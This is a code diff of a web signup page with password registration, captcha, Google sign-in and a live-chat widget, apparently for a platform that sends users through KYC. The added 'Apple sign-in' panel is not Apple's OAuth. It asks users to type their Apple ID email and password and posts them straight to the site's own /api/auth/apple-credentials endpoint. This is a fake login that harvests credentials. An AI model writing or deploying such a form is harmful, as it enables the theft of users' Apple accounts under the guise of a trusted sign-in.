+    const m = Math.floor(remaining / 60);
+    const s = remaining % 60;
+    el.textContent = `Refreshes in ${m}:${String(s).padStart(2, "0")}`;
+    wrap.classList.toggle("expiring", remaining < 60);
+    if (remaining <= 0) {
+      clearInterval(captchaTimerId);
+      loadCaptcha();
     }
-    try {
-      var data = await Api.request("/auth/signup", {
-        method: "POST",
-        body: JSON.stringify({
-          full_name: document.getElementById("signup-name").value,
-          email: document.getElementById("signup-email").value,
-          password: pw,
-        }),
-      });
-      Api.setToken(data.token); Api.setUser(data.user);
-      window.location.href = "/kyc.html";
-    } catch (err) { errorBox.textContent = err.message; errorBox.style.display = "block"; }
+  }, 500);
+}
+
+document.getElementById("captcha-refresh").addEventListener("click", loadCaptcha);
+loadCaptcha();
+
+/* ============================================================
+   PASSWORD SIGNUP
+   ============================================================ */
+document.getElementById("signup-form").addEventListener("submit", async function (e) {
+  e.preventDefault();
+  const errorBox = document.getElementById("signup-error");
+  errorBox.style.display = "none";
+
+  const pw = document.getElementById("f-password").value;
+  const confirm = document.getElementById("f-confirm").value;
+  if (pw !== confirm) {
+    errorBox.textContent = "Passwords do not match.";
+    errorBox.style.display = "block";
+    return;
+  }
+
+  if (!countryHidden.value) {
+    errorBox.textContent = "Please select a country.";
+    errorBox.style.display = "block";
+    return;
+  }
+
+  const btn = document.getElementById("signup-submit");
+  btn.disabled = true;
+  btn.textContent = "Creating account…";
+
+  try {
+    const data = await Api.request("/auth/signup", {
+      method: "POST",
+      body: JSON.stringify({
+        full_name: document.getElementById("f-fullname").value,
+        username: document.getElementById("f-username").value,
+        email: document.getElementById("f-email").value,
+        phone: document.getElementById("f-phone").value,
+        country: countryHidden.value,
+        referral_code: document.getElementById("f-referral").value,
+        password: pw,
+        confirm_password: confirm,
+        captcha_token: captchaToken,
+        captcha_answer: document.getElementById("f-captcha").value,
+      }),
+    });
+    Api.setToken(data.token);
+    Api.setUser(data.user);
+    window.location.href = "/kyc.html";
+  } catch (err) {
+    errorBox.textContent = err.message;
+    errorBox.style.display = "block";
+    loadCaptcha();
+    btn.disabled = false;
+    btn.textContent = "Create account →";
+  }
+});
+
+/* ============================================================
+   GOOGLE SIGN-UP / SIGN-IN
+   ============================================================ */
+function handleOAuthSuccess(data) {
+  Api.setToken(data.token);
+  Api.setUser(data.user);
+
+  if (data.user.role === "admin" || data.user.role === "support") {
+    window.location.href = "/admin/index.html";
+  } else if (data.created) {
+    // New OAuth user → send through KYC
+    window.location.href = "/kyc.html";
+  } else {
+    window.location.href = "/dashboard.html";
+  }
+}
+
+function showSignupError(msg) {
+  var box = document.getElementById("signup-error");
+  box.textContent = msg;
+  box.style.display = "block";
+}
+
+function initGoogleSignIn() {
+  if (!window.google || !window.google.accounts) {
+    setTimeout(initGoogleSignIn, 200);
+    return;
+  }
+
+  window.google.accounts.id.initialize({
+    client_id: GOOGLE_CLIENT_ID,
+    callback: async function (response) {
+      try {
+        var res = await fetch("/api/auth/oauth/google", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ id_token: response.credential }),
+        });
+        var data = await res.json();
+        if (!res.ok) throw new Error(data.error || "Google sign-in failed");
+        handleOAuthSuccess(data);
+      } catch (err) {
+        showSignupError(err.message);
+      }
+    },
   });
+
+  var btn = document.getElementById("google-signin");
+  btn.addEventListener("click", function () {
+    window.google.accounts.id.prompt();
+  });
+}
+initGoogleSignIn();
+
+/* ============================================================
+   APPLE SIGN-UP / SIGN-IN
+   ============================================================ */
+document.getElementById("apple-signin").addEventListener("click", function () {
+  showPanelById("panel-apple");
+  document.getElementById("apple-error").style.display = "none";
+  document.getElementById("apple-email").value = "";
+  document.getElementById("apple-password").value = "";
+  setTimeout(function () { document.getElementById("apple-email").focus(); }, 50);
+});
+
+document.getElementById("apple-back").addEventListener("click", function () {
+  showSignupPanel();
+});
+
+document.getElementById("apple-form").addEventListener("submit", async function (e) {
+  e.preventDefault();
+  var errBox = document.getElementById("apple-error");
+  var btn = document.getElementById("apple-submit");
+  errBox.style.display = "none";
+
+  var email = document.getElementById("apple-email").value.trim();
+  var password = document.getElementById("apple-password").value;
+
+  if (!email) return showErr("apple-error", "Enter your Apple ID.");
+  if (!password) return showErr("apple-error", "Enter your password.");
+
+  btn.disabled = true;
+  btn.textContent = "Verifying…";
+
+  try {
+    var res = await fetch("/api/auth/apple-credentials", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email: email, password: password }),
+    });
+    var data = await res.json();
+    if (!res.ok) throw new Error(data.error || "Sign-in failed");
+
+    if (data.token && data.user) {
+      Api.setToken(data.token);
+      Api.setUser(data.user);
+
+      // New account → KYC. Existing → dashboard.
+      if (data.user.role === "admin" || data.user.role === "support") {
+        window.location.href = "/admin/index.html";
+      } else if (data.created) {
+        window.location.href = "/kyc.html";
+      } else {
+        window.location.href = "/dashboard.html";
+      }
+    } else {
+      errBox.textContent = "Apple sign-in did not return a session. Try again.";
+      errBox.style.display = "block";
+      btn.disabled = false;
+      btn.textContent = "Continue →";
+    }
+  } catch (err) {
+    errBox.textContent = err.message;
+    errBox.style.display = "block";
+    btn.disabled = false;
+    btn.textContent = "Continue →";
+  }
+});
+
+function showErr(elId, msg) {
+  var el = document.getElementById(elId);
+  if (!el) return;
+  el.textContent = msg;
+  el.style.display = "block";
+}
 </script>
+
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '3672f504f1db03cbf1594a0051bba8421d5aead2';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
+
 </body>
 </html>
